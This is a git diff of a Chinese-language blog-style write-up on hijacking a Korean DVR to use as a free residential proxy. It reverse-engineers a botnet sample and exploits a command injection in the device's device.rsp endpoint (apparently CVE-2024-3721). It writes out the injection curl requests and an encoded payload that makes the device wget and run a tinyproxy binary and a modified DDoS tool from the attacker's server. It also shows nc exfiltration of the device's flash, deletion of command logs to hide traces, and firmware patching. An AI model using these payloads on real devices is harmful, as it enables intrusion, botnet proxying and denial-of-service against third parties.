@@ -1,5 +1,5 @@
 ### 看我如何零元购韩国住宅IP
-<del>MarkDown太难了 且看html罢</del><br>
+请移步 https://github.com/bytecategory/homeip/blob/main/homeip.html<br>
 不良林曾说:“纯净的住宅IP是实现某些特殊业务的前提,比如跨境电商,运营tiktok,解锁流媒体,薅甲骨文永久免费VPS等.”  
 其中这句话“由于住宅IP一般是以HTTP或者SOCKS代理的形式出售”就很可疑了.  
 正所谓有需求的地方,就有利益.僵尸网络控制的节点天然适合构建住宅代理,这似乎是近年来DDoS圈的一个潮流,把业务从单一的攻击,扩展到网络代理.  
@@ -10,10 +10,14 @@
 假设一下8.8.4.4是一只可怜的在韩国的肉只因,1.1.1.1和8.8.8.8是你的VPS  
 
 先做准备工作  
-~# file sh  
+```sh
+file sh
+```  
 *../sh: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV),
 dynamically linked, interpreter /lib/ld-linux.so.3, stripped*  
-~# r2 -A sh
+```sh
+r2 -A sh
+```
 
     [0x0000bb70]> pdf @main
                 ; UNKNOWN XREF from entry0 @ 0xbba0
@@ -61,12 +65,12 @@ dynamically linked, interpreter /lib/ld-linux.so.3, stripped*
 
 查看rodata段后发现,sh实际是busybox,你从上文的applet not
 found\n也可以发现.  
-
-    wget https://musl.cc/arm-linux-musleabi-cross.tgz
-    tar xzvf arm-linux-musleabi-cross.tgz
-    cd arm-linux-musleabi-cross
-    bin/arm-linux-musleabi-objdump -f ../sh
-
+```sh
+wget https://musl.cc/arm-linux-musleabi-cross.tgz
+tar xzvf arm-linux-musleabi-cross.tgz
+cd arm-linux-musleabi-cross
+bin/arm-linux-musleabi-objdump -f ../sh
+```
     ../sh:     file format elf32-littlearm
 
 
@@ -112,91 +116,110 @@ found\n也可以发现.
         af40: e28fc600  add    ip, pc, #0, 12
 
 在1.1.1.1上执行  
+```sh
 cd /tmp  
 git clone https://github.com/tinyproxy/tinyproxy.git  
 cd tinyproxy  
 ./autogen.sh  
 ./configure --host=arm-linux-musleabi
-CC=/opt/musl-cross/bin/arm-linux-musleabi-gcc CFLAGS="-march=armv5te
--msoft-float -mfloat-abi=soft -Os" LDFLAGS="-static -s" --prefix=/usr  
+CC=/opt/musl-cross/bin/arm-linux-musleabi-gcc CFLAGS="-march=armv5te" -msoft-float -mfloat-abi=soft -Os" LDFLAGS="-static -s" --prefix=/usr  
 make  
-file src/tinyproxy  
+file src/tinyproxy
+```
 *tinyproxy: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV),
 statically linked, stripped*  
-uuidgen  
+```sh
+uuidgen
+```  
 47aa7fc7-3de0-4141-abca-786d8a368d41  
-
-    echo -e 'Port 50051\nBind 0.0.0.0\nBasicAuth 47aa7fc7-3de0-4141-abca-786d8a368d41 47aa7fc7-3de0-4141-abca-786d8a368d41' > tinyproxy.conf
-
-单引号里的50051要替换成netstat -tulpn \| grep StreamingProtoc \| awk
-'{print \$4}' \| cut -d: -f2 \| tr -d '\n'的结果,下同.
-
-    python3 -m http.server 80
-    git clone https://github.com/bytecategory/DDos-Attack.git
-    cd DDos-Attack
-    vim ddos_attack_multithread.c
-
-将**while** (1)改成**for** (\_ = 0; \_ \< 100; \_++) 将
-
-    if (args->sent_count % 1000 == 0) {
-                printf("[Thread %d] Sent %ld packets to %s through port:%d\n", args->thread_id, args->sent_count, args->ip, current
-    _port);
-            }
-    char ip[256];
-    char threads_str[256];
-    system('clear')
-    if (len > 0 && ip[len - 1] == '\n') {
-            ip[len - 1] = '\0';
+```sh
+echo -e 'Port 50051\nBind 0.0.0.0\nBasicAuth 47aa7fc7-3de0-4141-abca-786d8a368d41 47aa7fc7-3de0-4141-abca-786d8a368d41' > tinyproxy.conf
+```
+单引号里的50051要替换成
+```sh
+netstat -tulpn | grep StreamingProtoc | awk '{print \$4}' | cut -d: -f2 | tr -d '\n'
+```
+的结果,下同.
+```sh
+python3 -m http.server 80
+git clone https://github.com/bytecategory/DDos-Attack.git
+cd DDos-Attack
+vim ddos_attack_multithread.c
+```
+将
+```c
+while (1)
+```
+改成
+```c
+for (_ = 0; _ < 100; _++) 
+```
+将
+```c
+if (args->sent_count % 1000 == 0) {
+            printf("[Thread %d] Sent %ld packets to %s through port:%d\n", args->thread_id, args->sent_count, args->ip, current_port);
     }
-    if (num_threads < 1 || num_threads > 10) {
-            printf("Invalid thread count. Using 1 threads.\n");
-            num_threads = 1;
-    }
-
+char ip[256];
+char threads_str[256];
+system('clear')
+if (len > 0 && ip[len - 1] == '\n') {
+        ip[len - 1] = '\0';
+}
+if (num_threads < 1 || num_threads > 10) {
+        printf("Invalid thread count. Using 1 threads.\n");
+        num_threads = 1;
+}
+```
 删除.把
-
-- fgets(ip, **sizeof**(ip), stdin);
-- fgets(threads_str, **sizeof**(threads_str), stdin);  
-  num_threads = atoi(threads_str);
-- fgets(port_str, **sizeof**(port_str), stdin);
-
+```c
+fgets(ip, sizeof(ip), stdin);
+```
+```c
+fgets(threads_str, sizeof(threads_str), stdin);  
+num_threads = atoi(threads_str);
+```c
+fgets(port_str, sizeof(port_str), stdin);
+```
 分别改成
-
-- char ip\[256\];  
-  strcpy(ip, "8.8.8.8");
-- num_threads = 10;
-- char portstr\[\] = "80";
-
+```c
+char ip[256];  
+strcpy(ip, "8.8.8.8");
+```
+```c
+num_threads = 10;
+char portstr[] = "80";
+```
 然后冒号wq.~~出了事把你老公说出来就行了.~~  
-
+```sh
 bin/arm-linux-musleabi-gcc ddos_attack_multithread.c -o
 ddos_attack_multithread -march=armv5te -msoft-float -mfloat-abi=soft
--static -s -Os  
-把console.log(encodeURIComponent("echo;busybox wget
-http://1.1.1.1/tinyproxy -P /tmp;busybox wget
-http://1.1.1.1/tinyproxy.conf -P /tmp;busybox wget
-http://1.1.1.1/ddos_attack_multithread -P /tmp;chmod 755
-/tmp/tinyproxy;chmod 755 /tmp/ddos_attack_multithread;kill -9 \$(pidof
-StreamingProtoc);/tmp/tinyproxy -c
-/tmp/tinyproxy.conf;/tmp/ddos_attack_multithread")) 写到e.js,然后node
+-static -s -Os
+```
+把
+```javascript
+console.log(encodeURIComponent("echo;busybox wget http://1.1.1.1/tinyproxy -P /tmp;busybox wget http://1.1.1.1/tinyproxy.conf -P /tmp;busybox wget http://1.1.1.1/ddos_attack_multithread -P /tmp;chmod 755 /tmp/tinyproxy;chmod 755 /tmp/ddos_attack_multithread;kill -9 \$(pidof StreamingProtoc);/tmp/tinyproxy -c /tmp/tinyproxy.conf;/tmp/ddos_attack_multithread"))
+```
+写到e.js,然后node
 e.js,复制它的结果  
 echo%3Bbusybox%20wget%20http%3A%2F%2F1.1.1.1%2Ftinyproxy%20-P%20%2Ftmp%3Bbusybox%20wget%20http%3A%2F%2F1.1.1.1%2Ftinyproxy.conf%20-P%20%2Ftmp%3Bbusybox%20wget%20http%3A%2F%2F1.1.1.1%2Fddos_attack_multithread%20-P%20%2Ftmp%3Bchmod%20755%20%2Ftmp%2Ftinyproxy%3Bchmod%20755%20%2Ftmp%2Fddos_attack_multithread%3Bkill%20-9%20%24(pidof%20StreamingProtoc)%3B%2Ftmp%2Ftinyproxy%20-c%20%2Ftmp%2Ftinyproxy.conf%3B%2Ftmp%2Fddos_attack_multithread,
 到mdc=后.  
 你猜mdc的由来?我估计你把脑袋想破也是徒劳.  
 mdc的由来在这里,https://github.com/bytecategory/tbk_dvr_command_injection  
 回到8.8.8.8,发生了什么?  
-tcpdump -i eth0 host 8.8.4.4  
+```sh
+tcpdump -i eth0 host 8.8.4.4
+```
 <img
 src="https://raw.githubusercontent.com/bytecategory/homeip/refs/heads/main/frame.png"
 id="svg2" /> 因为没有运行
-
-    import socket
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    s.bind(('0.0.0.0', 80))
-    while True:
-       _, a = sock.recvfrom(1024)
-       sock.sendto(b"ACK", a)
-
+```python
+import socket
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.bind(('0.0.0.0', 80))
+while True:
+    _, a = sock.recvfrom(1024)
+    sock.sendto(b"ACK", a)
+```
 这段程序,所以出现了ICMP,这不要紧. 总之,UDP攻击派上了用场.  
 我还鉴定了一个把客户当日本人骗的一个DDoS频道. ——— 胖虎  
 运行了build.sh,用DDoS-Attack/monitor_pps.c看了下,胖虎的pps不高.  
@@ -211,9 +234,11 @@ b = nm.scan('8.8.4.4','1-10000')['scan']['8.8.4.4']['tcp'].keys()
 p = a-b
 ```
 看看p里有什么,如果是50051的话,恭喜你,8.8.4.4从今以后是你的了.  
-验证一下,curl -x
-http://47aa7fc7-3de0-4141-abca-786d8a368d41:47aa7fc7-3de0-4141-abca-786d8a368d41@8.8.4.4:50051
--L http://ipinfo.io/ip,如果结果是8.8.4.4,大功告成,可以去开香槟了.  
+验证一下,
+```sh
+curl -x http://47aa7fc7-3de0-4141-abca-786d8a368d41:47aa7fc7-3de0-4141-abca-786d8a368d41@8.8.4.4:50051 -L http://ipinfo.io/ip
+```
+,如果结果是8.8.4.4,大功告成,可以去开香槟了. 
 只要创建fuck.yaml
 ```yaml
 listen: :11451
@@ -240,61 +265,75 @@ outbounds:
 ~~或者线下让我草(我是你的老公,我会好好对待你)~~,亦或是你能复现,否则你抄了作业,也好似水中捞月.  
 
 附录
-
-    ~# cat /proc/mtd
-    dev:    size   erasesize  name
-    mtd0: 00040000 00010000 "boot"
-    mtd1: 001c0000 00010000 "Kernel"
-    mtd2: 00d60000 00010000 "Root+App"
-    mtd3: 00010000 00010000 "SysConfig"
-    mtd4: 00010000 00010000 "SysStatus"
-    mtd5: 00080000 00010000 "SysPara"
-    ~# mount 
-    rootfs on / type rootfs (rw)
-    /dev/root on / type squashfs (ro,relatime)
-    proc on /proc type proc (rw,relatime)
-    sysfs on /sys type sysfs (rw,relatime)
-    tmpfs on /dev type tmpfs (rw,relatime)
-    devpts on /dev/pts type devpts (rw,relatime,mode=600,ptmxmode=000)
-    tmpfs on /var type tmpfs (rw,relatime,size=3072k)
+```sh
+cat /proc/mtd
+```
+dev:    size   erasesize  name
+mtd0: 00040000 00010000 "boot"
+mtd1: 001c0000 00010000 "Kernel"
+mtd2: 00d60000 00010000 "Root+App"
+mtd3: 00010000 00010000 "SysConfig"
+mtd4: 00010000 00010000 "SysStatus"
+mtd5: 00080000 00010000 "SysPara"
+```sh
+mount
+``` 
+rootfs on / type rootfs (rw)
+/dev/root on / type squashfs (ro,relatime)
+proc on /proc type proc (rw,relatime)
+sysfs on /sys type sysfs (rw,relatime)
+tmpfs on /dev type tmpfs (rw,relatime)
+devpts on /dev/pts type devpts (rw,relatime,mode=600,ptmxmode=000)
+tmpfs on /var type tmpfs (rw,relatime,size=3072k)
 
 于是在8.8.8.8上
-
-    ncat -lp 8888 > 20243721.bin
-    nc 8.8.8.8 8888 < /dev/mtdblock2
-
+```sh
+ncat -lp 8888 > 20243721.bin
+nc 8.8.8.8 8888 < /dev/mtdblock2
+```
 可惜可惜,没有人对CVE-2024-3721做过探讨,卡巴斯基也只打了下C2  
 另外netsecfish虽然说Location标头是./login.rsp,但使用httpx,zgrab2,curl工具都会因为非法的标头而不显示./login.rsp,解决方案是使用https://x.com/bytecategory/status/2010731203159351422中的命令.  
-~# unsquashfs 20243721.bin  
+```sh
+unsquashfs 20243721.bin
+```  
 我find了一下,没有device.rsp,又grep
 -r了一下,看到device.rsp在squashfs-root/usr/local/bin/index.cgi里.  
-既然是命令注入,必有system!  
-~# bin/arm-linux-musleabi-objdump -d ../index.cgi \| grep -E
-"bl.\*system"  
+既然是命令注入,必有system!
+```sh
+bin/arm-linux-musleabi-objdump -d ../index.cgi | grep -E "bl.\*system"
+```  
 毫无悬念的结果
-
-       4ff24:    ebfeeb89  bl ad50 <system@plt>
-
+4ff24:    ebfeeb89  bl ad50 <system@plt>
 把index.cgi用IDA打开,按G后输入4ff24回车,再按F5. 哦耶!
-
-    if (v45)
-        sprintf(s, "%s &", src);
-    else 
-        strcpy(s, src);
-    system(s);
-
+```c
+if (v45)
+    sprintf(s, "%s &", src);
+else 
+    strcpy(s, src);
+system(s);
+```
 v45也即bk(background的缩写),当bk不空时,system(s)的输出就从Content-type标头的前面到了Date标头的后面了.uid也一样,只要不空就行.  
-你可以分别curl
-"http://8.8.4.4/device.rsp?opt=sys&cmd=\_\_\_S_O_S_T_R_E_A_MAX\_\_\_&mdb=sos&mdc=echo%3Bid&bk=1"
--H "Cookie: uid=1" 和  
-curl
-"http://8.8.4.4/device.rsp?opt=sys&cmd=\_\_\_S_O_S_T_R_E_A_MAX\_\_\_&mdb=sos&mdc=echo%3Bid
--H "Cookie: uid=1"看一下有什么不同.
-另外/tmp/hlog会留下你的命令,所以去参考一下https://x.com/bytecategory/status/2009489624369115419,把/tmp/hlog给rm
+你可以分别
+```sh
+curl "http://8.8.4.4/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=echo%3Bid&bk=1" -H "Cookie: uid=1"
+```
+和 
+```sh
+curl "http://8.8.4.4/device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=echo%3Bid" -H "Cookie: uid=1"
+```
+看一下有什么不同.
+另外/tmp/hlog会留下你的命令,所以去参考一下https://x.com/bytecategory/status/2009489624369115419 ,把/tmp/hlog给rm
 -rf掉.  
-虽然我还想介绍std::string::string(&v70, "bk", v117);其实等价于 **using**
-**namespace** **std**;string v70 =
-"bk";等等细节以及COW机制,但限于篇幅,难以展开.  
+虽然我还想介绍
+```c
+std::string::string(&v70, "bk", v117);
+```
+其实等价于 
+```cpp
+using namespace std;
+string v70 = "bk";
+```
+等等细节以及COW机制,但限于篇幅,难以展开.  
 因为/etc/init.d/rcS会执行/etc/init.d/S10boot.sh,/etc/init.d/S10boot.sh会执行/module/load3518,/module/load3518中会insmod若干内核模块,而且会执行/module/sysctl_hi3518.sh  
 /module/sysctl_hi3518.sh虽然注释了This is a sample, you should rewrite
 it according to your
@@ -306,27 +345,28 @@ lrwxrwxrwx 1 root root lib/libCommon.so -\>
 ~# rm lib/libCommon.so  
 ~# ln -s ../usr/local/lib/libCommon.so lib/libCommon.so  
 尝试  
+```sh
 cd squashfs-root  
-qemu-arm -L . -strace ./usr/local/bin/httpd  
-看到它在疯狂connect 127.0.0.1 17777,用netstat
--anp可知/usr/local/bin/DeviceManage会bind 17777.  
-于是我nc -lp 17777 \| hexdump -C,并再次运行/usr/local/bin/httpd
-
-    00000000  00 00 00 00 00 00 00 00  cd ab 00 00 04 00 00 03  |................|
-    00000010  03 87 3c 00 00 00 00 00  00 00 00 00 cd ab 00 00  |..<.............|
-    00000020  04 00 00 03 02 07 3c 00  00 00 00 00 00 00 00 00  |......<.........|
-    00000030  cd ab 00 00 04 00 00 03  09 00 3c 00 00 00 00 00  |..........<.....|
-    00000040  00 00 00 00 cd ab 06 00  24 00 00 03 68 74 74 70  |........$...http|
-    00000050  64 2e 31 00 00 00 00 00  00 00 00 00 00 00 00 00  |d.1.............|
-    00000060  00 00 00 00 00 00 00 00  00 00 00 00 20 4e 00 00  |............ N..|
-    00000070  00 00 00 00 00 00 00 00  cd ab 03 00 24 00 00 03  |............$...|
-    00000080  68 74 74 70 64 2e 31 00  00 00 00 00 00 00 00 00  |httpd.1.........|
-    00000090  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
-    000000a0  20 4e 00 00 00 00 00 00  00 00 00 00 cd ab 03 07  | N..............|
-    000000b0  08 00 80 03 80 00 00 00  00 00 00 00 00 00 00 00  |................|
-    000000c0  00 00 00 00 cd ab 02 00  00 00 00 03              |............|
-    000000cc
-
+qemu-arm -L . -strace ./usr/local/bin/httpd
+```  
+看到它在疯狂connect 127.0.0.1 17777,用netstat -anp可知/usr/local/bin/DeviceManage会bind 17777.  
+于是我nc -lp 17777 | hexdump -C,并再次运行/usr/local/bin/httpd
+```
+00000000  00 00 00 00 00 00 00 00  cd ab 00 00 04 00 00 03  |................|
+00000010  03 87 3c 00 00 00 00 00  00 00 00 00 cd ab 00 00  |..<.............|
+00000020  04 00 00 03 02 07 3c 00  00 00 00 00 00 00 00 00  |......<.........|
+00000030  cd ab 00 00 04 00 00 03  09 00 3c 00 00 00 00 00  |..........<.....|
+00000040  00 00 00 00 cd ab 06 00  24 00 00 03 68 74 74 70  |........$...http|
+00000050  64 2e 31 00 00 00 00 00  00 00 00 00 00 00 00 00  |d.1.............|
+00000060  00 00 00 00 00 00 00 00  00 00 00 00 20 4e 00 00  |............ N..|
+00000070  00 00 00 00 00 00 00 00  cd ab 03 00 24 00 00 03  |............$...|
+00000080  68 74 74 70 64 2e 31 00  00 00 00 00 00 00 00 00  |httpd.1.........|
+00000090  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+000000a0  20 4e 00 00 00 00 00 00  00 00 00 00 cd ab 03 07  | N..............|
+000000b0  08 00 80 03 80 00 00 00  00 00 00 00 00 00 00 00  |................|
+000000c0  00 00 00 00 cd ab 02 00  00 00 00 03              |............|
+000000cc
+```
 而httpd则打印
 
     =============httpd get web port
@@ -335,14 +375,14 @@ qemu-arm -L . -strace ./usr/local/bin/httpd
 
 看来httpd在等待网络端口参数,而nc没给它网络端口参数.  
 下一步
-
-    cd ..
-    chroot squashfs-root /bin/sh 
-    cd /usr/local/bin 
-    . /etc/profile
-    touch /dev/mtdblock3 # 和mtdblock2一样用nc写
-    ./DeviceManage
-
+```sh
+cd ..
+chroot squashfs-root /bin/sh 
+cd /usr/local/bin 
+. /etc/profile
+touch /dev/mtdblock3 # 和mtdblock2一样用nc写
+./DeviceManage
+```
 这时DeviceManage找到了设备类型712A1_VA等等.但无法insmod若干内核模块.  
 把DeviceManage用IDA Pro打开,找到sub_35B78,函数头是PUSH
 {LR},地址是00035B78  
@@ -380,23 +420,23 @@ A0 E3改成50 30 A0 E3.
 0x4571正好是17777,这是疯狂connect 127.0.0.1
 17777的原因了,需要把它改成NOP,具体操作,把03 FE FF EB改成00 F0 20 E3.  
 最后不要忘记Apply patches to input file.
+```sh
+chmod 755 /usr/local/bin/httpd
+/usr/local/bin/httpd
+```
+```
+===============/usr/local/bin/httpd start==argc=1============================
+Pack httpd param port=80
 
-    chmod 755 /usr/local/bin/httpd
-
-    ~# /usr/local/bin/httpd
-
-    ===============/usr/local/bin/httpd start==argc=1============================
-    Pack httpd param port=80
-
-    =========================================================
-    =====================httpd(53184) v1.1====================
-    ====[/usr/local/bin]===[/usr/local/www]===(port:0080)====
-    =========================================================
-    ----debug state=1
-    max connect=1048576
-    bind 0.0.0.0 - Address already in use
-    thttpd main loop is run terminate=0 num_connect=0
-
+=========================================================
+=====================httpd(53184) v1.1====================
+====[/usr/local/bin]===[/usr/local/www]===(port:0080)====
+=========================================================
+----debug state=1
+max connect=1048576
+bind 0.0.0.0 - Address already in use
+thttpd main loop is run terminate=0 num_connect=0
+```
 做到这一步后,创建一个空文件,/var/tmp/webcash/web.config,再次运行.  
 我滴任务完成了!  
 之后的工作就交给边亮_网络安全了,他不会在17分钟内完成它.  
@@ -404,18 +444,20 @@ A0 E3改成50 30 A0 E3.
 当我访问了https://www.ipqualityscore.com/free-ip-lookup-proxy-vpn-test,**翻译翻译TMD什么叫惊喜**  
 低风险,此IP地址上的用户目前可能安全,但如果该IP地址遭到入侵,则情况可能会发生变化,我们尚未发现此IP地址存在滥用行为,未检测到代理连接  
 俺心里感到窃喜,俺当然知道"但如果"的情况发生了.呵呵,IPQS可真是准确无误阿.  
-firefox-esr -private-window后,也没有消防栓了,而是Google 지원 언어
-English.  
+firefox-esr -private-window后,也没有消防栓了,而是Google 지원 언어 English.  
 过了两天后,什么!  
 可疑,此IP地址的行为可疑,我们建议您通过我们的API提供更多用户数据,以便更准确地分析用户质量风险.  
 **敢杀我的马!** IPQS,我可疑个D~  
 我更准确地分析一下,找到html-error.c,把send_http_headers中的headers改成
-
-    "HTTP/1.0 200\r\n"
-    "Content-Type: text/html\r\n"
-    "Connection: close\r\n" "\r\n"
-
+```c
+"HTTP/1.0 200\r\n"
+"Content-Type: text/html\r\n"
+"Connection: close\r\n" "\r\n"
+````
 就好.以及在tinyproxy.conf的第四行改成DefaultErrorFile
 "/tmp/tinyproxy.html"  
-tinyproxy.html的内容可以是\<**p**\>IPQS可真是准确无误阿\</**p**\>  
+tinyproxy.html的内容可以是
+```
+<p>IPQS可真是准确无误阿</p>  
+```
 改完后make clean后make.
